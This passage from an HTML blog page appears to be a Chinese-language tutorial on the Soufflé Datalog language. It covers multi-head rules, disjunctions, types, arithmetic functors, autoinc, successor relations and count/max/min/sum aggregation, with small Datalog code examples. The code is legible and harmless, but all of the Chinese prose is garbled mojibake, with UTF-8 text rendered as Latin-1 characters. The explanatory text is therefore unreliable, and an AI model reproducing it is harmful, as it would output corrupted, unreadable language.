<span class="symbol">A</span>(<span class="symbol">IO</span>=sqlite, dbname=<span class="string">&quot;path/to/sqlite3db&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h3><p>Datalog ä¸­çš„ç›®æ ‡æ˜¯å½¢å¼ä¸º <code>false &lt;= p</code> çš„é€»è¾‘å…³ç³»ï¼Œå…¶ä¸­ <code>p</code> æ˜¯é€»è¾‘å…³ç³»ã€‚åœ¨ SoufflÃ© ä¸­ç›®æ ‡æ˜¯ç”±è¾“å‡ºæŒ‡ä»¤æ¨¡æ‹Ÿçš„ï¼Œä¼˜ç‚¹æ˜¯å¯ä»¥åœ¨ä¸€æ¬¡ SoufflÃ© ç¨‹åºçš„æ‰§è¡Œä¸­è¯„ä¼°å¤šä¸ªç‹¬ç«‹çš„ç›®æ ‡ã€‚</p><h3 id="è¯­æ³•ä¾¿åˆ©"><a href="#è¯­æ³•ä¾¿åˆ©" class="headerlink" title="è¯­æ³•ä¾¿åˆ©"></a>è¯­æ³•ä¾¿åˆ©</h3><p>å¯ä»¥ç¼–å†™å…·æœ‰å¤šä¸ªå¤´çš„è§„åˆ™ï¼Œè¿™æ˜¯ä¸€ç§è¯­æ³•ç³–ï¼Œå¯ä»¥æœ€å¤§é™åº¦åœ°å‡å°‘ç¼–ç å·¥ä½œã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨æ­¤åŠŸèƒ½çš„ä»£ç ç‰‡æ®µä»¥åŠæœªåº”ç”¨è½¬æ¢çš„ç­‰æ•ˆä»£ç ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Multiple</span> heads</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x), <span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).     // åŒæ—¶å®šä¹‰</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br><span class="line"></span><br><span class="line">// <span class="symbol">Single</span> head</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°ï¼Œè§„åˆ™ä½“ä¸­çš„æå–ï¼ˆdisjunctionsï¼‰ä¹Ÿå¯ä»¥ä½œä¸ºè¯­æ³•ç³–ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Disjunction</span> in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :-</span><br><span class="line">  edge(x,y);        // æˆ–</span><br><span class="line">  edge(x,q), path(q,y).</span><br><span class="line">.output path</span><br><span class="line"></span><br><span class="line">// <span class="symbol">No</span> disjunction in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :- edge(x,y).</span><br><span class="line">path(x,y) :- edge(x,q), path(q,y).</span><br></pre></td></tr></table></figure><h2 id="ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ"><a href="#ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ" class="headerlink" title="ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ"></a>ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ</h2><p>SoufflÃ© çš„ç±»å‹ç³»ç»Ÿæ˜¯é™æ€çš„ï¼Œå°±åƒ C ä¹‹ç±»çš„è¯­è¨€ä¸€æ ·ï¼Œè€Œä¸ Python ä¹‹ç±»çš„è¯­è¨€ä¸åŒã€‚å¿…é¡»åœ¨ç¼–è¯‘ï¼ˆæˆ–è§£é‡Šï¼‰ä¹‹å‰å®šä¹‰å…³ç³»çš„å±æ€§ï¼Œå¹¶åœ¨ç¼–è¯‘æ—¶æ£€æŸ¥ç±»å‹ã€‚è®©ç¨‹åºå‘˜æ¸…æ¥šåœ°äº†è§£å…³ç³»çš„å®šä¹‰åŠå…¶ç”¨æ³•ï¼Œåœ¨è¿è¡Œæ—¶ä¸è¿›è¡ŒåŠ¨æ€æ£€æŸ¥èƒ½å¤Ÿæœ€å¤§é™åº¦åœ°å‡å°‘è¯„ä¼°æ—¶é—´ã€‚</p><h3 id="åŸå­ç±»å‹"><a href="#åŸå­ç±»å‹" class="headerlink" title="åŸå­ç±»å‹"></a>åŸå­ç±»å‹</h3><p>SoufflÃ© æœ‰ä¸¤ç§åŸºæœ¬ç±»å‹ï¼Œç¬¦å·ç±»å‹ <code>symbol</code> å’Œæ•°å­—ç±»å‹ <code>number</code>ã€‚ç¬¦å·ç±»å‹åŒ…å«æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œåœ¨å†…éƒ¨ç”±ä¸€ä¸ªåºæ•°ï¼ˆordinal numberï¼‰è¡¨ç¤ºã€‚å€¼ <code>ord(&quot;hello&quot;)</code> å¯¹åº”äºç»™å®šç¨‹åºçš„è¿™ä¸ªåºæ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯å­—ç¬¦ä¸² â€œhelloâ€ã€‚æ•°å­—ç±»å‹åŒ…æ‹¬æ‰€æœ‰æ•°å­—çš„å…¨åŸŸã€‚</p><h2 id="ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼"><a href="#ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼" class="headerlink" title="ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼"></a>ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼</h2><p>SoufflÃ© å…è®¸ç®—æœ¯å‡½å­ï¼Œæ‰©å±•äº†ä¼ ç»Ÿçš„ Datalog è¯­ä¹‰ï¼Œå‡½å­ä¸­çš„å˜é‡å¯èƒ½ä¸åŒ…å«ä»»ä½•è‡ªç”±å˜é‡ã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæœ€åä¸€è¡Œè¿æ¥ä¸­çš„ç¬¬äºŒä¸ªæ¡ä»¶è°ƒç”¨äº†ç®—æœ¯è¿ç®—ç¬¦ <code>&lt;</code>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br><span class="line"><span class="symbol">A</span>(x+<span class="number">1</span>) :- <span class="symbol">A</span>(x), x &lt; <span class="number">9.</span>  // å½“ x å°äº <span class="number">9</span> æ—¶</span><br></pre></td></tr></table></figure><p>æ‰“å°æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Fib</span>(i:number, a:number)</span><br><span class="line">.output <span class="symbol">Fib</span></span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">1</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">2</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(i + <span class="number">1</span>, a + b) :- <span class="symbol">Fib</span>(i, a), <span class="symbol">Fib</span>(i<span class="number">-1</span>, b), i &lt; <span class="number">10.</span></span><br></pre></td></tr></table></figure><p>SoufflÃ© ä¸­å…è®¸ä½¿ç”¨ä»¥ä¸‹ç®—æœ¯å‡½å­ï¼š</p><ul><li>åŠ æ³•ï¼š<code>x + y</code></li><li>å‡æ³•ï¼š<code>x - y</code></li><li>é™¤æ³•ï¼š<code>x / y</code></li><li>ä¹˜æ³•ï¼š<code>x * y</code></li><li>æ¨¡æ•°ï¼š<code>a % b</code></li><li>å¹‚ï¼š<code>a ^ b</code></li><li>è®¡æ•°å™¨ï¼š<code>autoinc()</code></li><li>ä½æ“ä½œï¼š<code>x band y</code>ã€<code>x bor y</code>ã€<code>x bxor y</code> å’Œ <code>bnot x</code></li><li>é€»è¾‘è¿ç®—ï¼š<code>x land y</code>ã€<code>x lor y</code> å’Œ <code>lnot x</code></li></ul><p>SoufflÃ© ä¸­å…è®¸ä»¥ä¸‹ç®—æœ¯çº¦æŸï¼š</p><ul><li>å°äºï¼š<code>a &lt; b</code></li><li>å°äºæˆ–ç­‰äºï¼š<code>a &lt;= b</code></li><li>ç­‰äºï¼š<code>a = b</code></li><li>ä¸ç­‰äºï¼š<code>a != b</code></li><li>å¤§äºæˆ–ç­‰äºï¼š<code>a &gt;= b</code></li><li>å¤§äºï¼š<code>a &gt; b</code></li></ul><p>åœ¨æºç ä¸­ï¼Œæ•°å­—å¯ä»¥å†™æˆåè¿›åˆ¶ã€äºŒè¿›åˆ¶å’Œåå…­è¿›åˆ¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">4711</span>).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span>b101).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0xaffe</span>).</span><br></pre></td></tr></table></figure><h3 id="æ•°å­—ç¼–ç "><a href="#æ•°å­—ç¼–ç " class="headerlink" title="æ•°å­—ç¼–ç "></a>æ•°å­—ç¼–ç </h3><p>æ•°å­—å¯ä»¥ç”¨ä½œé€»è¾‘å€¼ï¼Œå¦‚åœ¨ C ä¸­ï¼š</p><ul><li><code>0</code> ä»£è¡¨å‡</li><li><code>!= 0</code> ä»£è¡¨çœŸ</li></ul><p>å› æ­¤ï¼Œå®ƒä»¬å¯ç”¨äºé€»è¾‘è¿ç®— <code>xland y</code>ã€<code>x lor y</code> å’Œ <code>lnot x</code>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span> lor <span class="number">1</span>).</span><br></pre></td></tr></table></figure><h3 id="å‡½å­-autoinc"><a href="#å‡½å­-autoinc" class="headerlink" title="å‡½å­ autoinc()"></a>å‡½å­ autoinc()</h3><p>å‡½å­ <code>autoinc()</code> åœ¨æ¯æ¬¡æ±‚å€¼æ—¶éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°æ•°å­—ï¼Œä½†æ˜¯ä¸å…è®¸åœ¨é€’å½’å…³ç³»ä¸­ä½¿ç”¨ã€‚å¯ç”¨äºä¸ºç¬¦å·åˆ›å»ºå”¯ä¸€ç¼–å·ï¼ˆå……å½“æ ‡è¯†ç¬¦ï¼‰ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x: symbol)</span><br><span class="line"><span class="symbol">A</span>(â€œaâ€). <span class="symbol">A</span>(â€œbâ€). <span class="symbol">A</span>(â€œcâ€). <span class="symbol">A</span>(â€œdâ€).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x: symbol, y: number)</span><br><span class="line">.output <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x, autoinc()) :- <span class="symbol">A</span>(x).    // ä¸º aã€bã€cã€d å„ç”Ÿæˆä¸€ä¸ªæ ‡è¯†ç¬¦</span><br></pre></td></tr></table></figure><p>ç»™å®šä¸€ä¸ªé›†åˆ <code>A(x:symbol)</code>ï¼Œåˆ›å»ºä¸€ä¸ªåç»§å…³ç³» <code>Succ(x:symbol, y:symbol)</code> ä½¿å¾—ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å« A ä¸­çš„å…ƒç´  xï¼Œç¬¬äºŒä¸ªå‚æ•°åŒ…å« x çš„åç»§ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ª A çš„å…ƒç´ ã€‚<br>ä¾‹å¦‚ï¼Œé›†åˆ <code>A = &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;&#125;</code> å…·æœ‰åç»§å…³ç³» <code>Succ=((&quot;a&quot;, &quot;b&quot;), (&quot;b&quot;, &quot;c&quot;), (&quot;c&quot;, &quot;d&quot;)&#125;</code>ã€‚å‡è®¾ä¸€ä¸ªå…ƒç´ ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªç¬¦å·ï¼‰çš„æ€»é¡ºåºæ ¹æ®å®ƒçš„åºæ•°è®¡ç®—ï¼Œå†…éƒ¨è¡¨ç¤ºä¸ºä¸€ä¸ªæ•°å­—ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:symbol) input         // é›†åˆ</span><br><span class="line">.decl <span class="symbol">Less</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Less</span>(x,y) :- <span class="symbol">A</span>(x), <span class="symbol">A</span>(y), ord(x) &lt; ord(y).   // æ’åºå…³ç³»ï¼šx &lt; y</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Transitive</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Transitive</span>(x,z) :- <span class="symbol">Less</span>(x,y), <span class="symbol">Less</span>(y,z).    // ä¼ é€’å…³ç³»ï¼šx &lt; y &amp;&amp; y &lt; z =&gt; (x, z)</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Succ</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Succ</span>(x,y) :- <span class="symbol">Less</span>(x,y), !<span class="symbol">Transitive</span>(x,y).   // åç»§å…³ç³»ï¼šx &lt; y &amp;&amp; ä¸å­˜åœ¨ä¼ é€’å…³ç³»</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Less</span>, <span class="symbol">Transitive</span>, <span class="symbol">Succ</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—åç»§å…³ç³»çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå…ƒç´ ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">First</span>(x: symbol) output</span><br><span class="line"><span class="symbol">First</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(<span class="symbol">_</span>, x).  // æ²¡æœ‰å‰é©±</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Last</span>(x: symbol) output</span><br><span class="line"><span class="symbol">Last</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(x, <span class="symbol">_</span>).   // æ²¡æœ‰åç»§</span><br></pre></td></tr></table></figure><h2 id="ä¾‹5ï¼šèšåˆ"><a href="#ä¾‹5ï¼šèšåˆ" class="headerlink" title="ä¾‹5ï¼šèšåˆ"></a>ä¾‹5ï¼šèšåˆ</h2><p>SoufflÃ© ä¸­çš„èšåˆæ˜¯æŒ‡ä½¿ç”¨ç‰¹å®šçš„å‡½å­æ¥æ±‡æ€»æœ‰å…³æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œèšåˆç±»å‹åŒ…æ‹¬è®¡æ•°ã€æ±‚æœ€å°å€¼&#x2F;æœ€å¤§å€¼ã€æ±‚å’Œã€‚åœ¨ SoufflÃ© ä¸­ï¼Œä¿¡æ¯é€šå¸¸ä¸èƒ½ä»å­ç›®æ ‡ï¼ˆèšåˆå‡½å­çš„å‚æ•°ï¼‰æµåˆ°å¤–éƒ¨ä½œç”¨åŸŸã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æ‰¾åˆ°å…³ç³» Cost(x) çš„æœ€å°å€¼ï¼Œæ— æ³•æ‰¾åˆ°ä½¿æˆæœ¬æœ€å°åŒ–çš„ç‰¹å®š x å€¼ï¼Œå› ä¸ºè¿™æ ·çš„ x å€¼å¯èƒ½ä¸æ˜¯å”¯ä¸€çš„ã€‚</p><h3 id="è®¡æ•°"><a href="#è®¡æ•°" class="headerlink" title="è®¡æ•°"></a>è®¡æ•°</h3><p>è®¡æ•°å‡½å­ç”¨äºè®¡ç®—å­ç›®æ ‡çš„é›†åˆå¤§å°ï¼Œè¯­æ³•ä¸º <code>count:&#123;&lt;sub-goal&gt;&#125;</code>ã€‚</p><p>ä»¥ä¸‹ç¤ºä¾‹è¾“å‡ºâ€œè“è‰²â€æ±½è½¦çš„æ•°é‡ï¼Œå³ Car ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸ºâ€œè“è‰²â€çš„å…ƒç´ æ•°é‡ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Car</span>(name: symbol, colour:symbol)</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;Audi&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;VW&quot;</span>, <span class="string">&quot;red&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;BMW&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">BlueCarCount</span>(x: number)</span><br><span class="line"><span class="symbol">BlueCarCount</span>(c) :- c = count:&#123;<span class="symbol">Car</span>(<span class="symbol">_</span>, <span class="string">&quot;blue&quot;</span>)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">BlueCarCount</span></span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§å€¼-x2F-æœ€å°å€¼-x2F-æ±‚å’Œ"><a href="#æœ€å¤§å€¼-x2F-æœ€å°å€¼-x2F-æ±‚å’Œ" class="headerlink" title="æœ€å¤§å€¼&#x2F;æœ€å°å€¼&#x2F;æ±‚å’Œ"></a>æœ€å¤§å€¼&#x2F;æœ€å°å€¼&#x2F;æ±‚å’Œ</h3><p>max å‡½å­è¾“å‡ºé›†åˆçš„æœ€å¤§å€¼ï¼Œè¯­æ³•ä¸º <code>max &lt;var&gt;:&#123;&lt;sub-goal(&lt;var&gt;)&gt;&#125;</code>ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">10</span>). <span class="symbol">A</span>(<span class="number">100</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">MaxA</span>(x: number)</span><br><span class="line"><span class="symbol">MaxA</span>(y) :- y = max x:&#123;<span class="symbol">A</span>(x)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">MaxA</span></span><br></pre></td></tr></table></figure><p>æœ€å°å€¼è¯­æ³•ä¸º <code>min &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>ï¼›æ±‚å’Œè¯­æ³•ä¸º <code>sum &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>ã€‚</p><h1 id="Souffle-ç¨‹åº"><a href="#Souffle-ç¨‹åº" class="headerlink" title="SoufflÃ© ç¨‹åº"></a>SoufflÃ© ç¨‹åº</h1><p>ä¸»è¦æ•´ç† Doop ä¸­ç”¨åˆ°çš„ä¸€äº›å†…å®¹ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„å…³ç³»ã€ç±»å‹ã€è§„åˆ™ï¼Œä»¥åŠè¿›é˜¶çš„è‡ªå®šä¹‰å‡½å­ã€ç»„ä»¶ã€ç¼–è¯‘æŒ‡ä»¤ã€‚ï¼ˆè¿™ä¸æ˜¯å…¨åŒ…å«äº†å—ğŸ˜…ï¼‰</p><ul><li>è¯­è¨€ï¼ˆLanguageï¼‰</li><li>å…³ç³»ï¼ˆRelationsï¼‰</li><li>ç±»å‹ï¼ˆTypesï¼‰</li><li>è§„åˆ™ï¼ˆRulesï¼‰</li><li>ç»„ä»¶ï¼ˆComponentsï¼‰</li><li>ç”¨æˆ·å®šä¹‰å‡½å­ï¼ˆUser-Defined Functorsï¼‰</li><li>ç¼–è¯‘æŒ‡ä»¤ï¼ˆPragmaï¼‰</li></ul><h2 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h2><h3 id="è¯­è¨€"><a href="#è¯­è¨€" class="headerlink" title="è¯­è¨€"></a>è¯­è¨€</h3><p>SoufflÃ© ä¸­çš„ä¸»è¦è¯­è¨€å…ƒç´ æ˜¯å…³ç³»å£°æ˜ï¼ˆrelation declarationsï¼‰ã€äº‹å®ï¼ˆfactsï¼‰ã€è§„åˆ™ï¼ˆrulesï¼‰å’ŒæŒ‡ä»¤ï¼ˆdirectivesï¼‰ã€‚</p><p>ä¾‹å¦‚ï¼Œä»¥ä¸‹ç¨‹åºä¸­åŒ…å«ä¸¤ä¸ªå…³ç³» A å’Œ Bï¼Œå…³ç³»å¿…é¡»å£°æ˜ï¼ˆä»¥ä¾¿ç¼–è¯‘æ—¶æ£€æŸ¥å±æ€§çš„ä½¿ç”¨ï¼‰ï¼›å…³ç³» A æœ‰ä¸¤ä¸ªäº‹å®ï¼š<code>A(1,2).</code> å’Œ <code>A(2,3).</code>ï¼Œäº‹å®æ˜¯æ— æ¡ä»¶æˆç«‹çš„è§„åˆ™ï¼Œå³äº‹å®æ˜¯ Horn Clause <code>A(1,2) â‡ true</code>ï¼›å…³ç³» B æœ‰ä¸¤ä¸ªè§„åˆ™ï¼š<code>B(x,y) :- A(x,y).</code> å’Œ <code>B(x,z) :- A(x,y), B(y,z).</code>ï¼Œè¡¨ç¤º Horn Clause <code>B(x,y) â‡ A(x,y)</code> å’Œ <code>B(x,y) â‡ A(x,y), B(y,z)</code>ã€‚</p><ul><li>Horn Clause çš„è§£é‡Šå¯ä»¥çœ‹ï¼š<a href="http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html">http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html</a></li></ul><p>æœ€åçš„æŒ‡ä»¤ <code>.output B</code> è¡¨ç¤ºåœ¨æ‰§è¡Œç»“æŸæ—¶æŸ¥è¯¢å…³ç³» Bï¼Œå¹¶å°†å…¶å†™å…¥æ–‡ä»¶æˆ–æ‰“å°åˆ°å±å¹•ä¸­ã€‚å…³ç³»å£°æ˜ã€äº‹å®ã€è§„åˆ™å’ŒæŒ‡ä»¤çš„é¡ºåºå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œå¹¶ä¸å½±å“æœ€ç»ˆçš„æ‰§è¡Œã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number)  // declaration of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>,<span class="number">2</span>).                      // facts of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x:number, y:number)  // declaration of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,y) :- <span class="symbol">A</span>(x,y).            // rules of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,z) :- <span class="symbol">A</span>(x,y), <span class="symbol">B</span>(y,z).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">B</span>                    // <span class="symbol">Output</span> relation <span class="symbol">B</span> </span><br></pre></td></tr></table></figure><h3 id="å…³ç³»"><a href="#å…³ç³»" class="headerlink" title="å…³ç³»"></a>å…³ç³»</h3><p>SoufflÃ© è¦æ±‚å£°æ˜å…³ç³»ï¼Œå…³ç³»æ˜¯ä¸€ç»„æœ‰æœ‰åºå…ƒç»„ <code>(x1, ..., xk)</code>ï¼Œå…¶ä¸­æ¯ä¸ªå…ƒç´  <code>xi</code> éƒ½æ˜¯ç”±ç±»å‹å®šä¹‰çš„æ•°æ®åŸŸçš„æˆå‘˜ã€‚ä»¥ä¸‹å£°æ˜å®šä¹‰äº†ä»…åŒ…å«æ•°å­—å¯¹çš„å…³ç³» Aï¼Œç¬¬ä¸€ä¸ªå±æ€§è¢«å‘½åä¸º xï¼Œç¬¬äºŒä¸ªå±æ€§è¢«å‘½åä¸º yï¼Œä¸¤ä¸ªå±æ€§çš„ç±»å‹éƒ½æ˜¯æ•°å­—ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number).</span><br></pre></td></tr></table></figure><p>SoufflÃ© çš„ç±»å‹æ£€æŸ¥å™¨å°†æ¨æ–­è§„åˆ™ä¸­çš„å˜é‡ç±»å‹ï¼Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦æ­£ç¡®ä½¿ç”¨ã€‚</p><h3 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h3><p>SoufflÃ© åˆ©ç”¨ç±»å‹åŒ–çš„ Datalog æ–¹è¨€è¿›è¡Œé™æ€æ£€æŸ¥ï¼Œä»è€Œèƒ½å¤Ÿææ—©å‘ç°æŸ¥è¯¢è§„èŒƒä¸­çš„é”™è¯¯ã€‚å¿…é¡»ä¸ºå…³ç³»çš„ä»»ä½•å±æ€§æŒ‡å®šç±»å‹ï¼ŒSoufflÃ© ä¸­æœ‰å››ç§åŸå§‹ç±»å‹ï¼šç¬¦å·ï¼ˆ<code>symbol</code>ï¼‰ã€æ•°å­—ï¼ˆ<code>number</code>ï¼‰ã€æ— ç¬¦å·æ•°å­—ï¼ˆ<code>unsigned</code>ï¼‰ã€æµ®ç‚¹æ•°ï¼ˆ<code>float</code>ï¼‰ã€‚</p><h3 id="è§„åˆ™"><a href="#è§„åˆ™" class="headerlink" title="è§„åˆ™"></a>è§„åˆ™</h3><p>è§„åˆ™æ˜¯æ¡ä»¶é€»è¾‘è¯­å¥ï¼Œä»¥å¤´éƒ¨å¼€å§‹ï¼Œç„¶åæ˜¯èº«ä½“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€å¯¹ (x, y) åœ¨ B ä¸­åˆ™ A æˆç«‹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 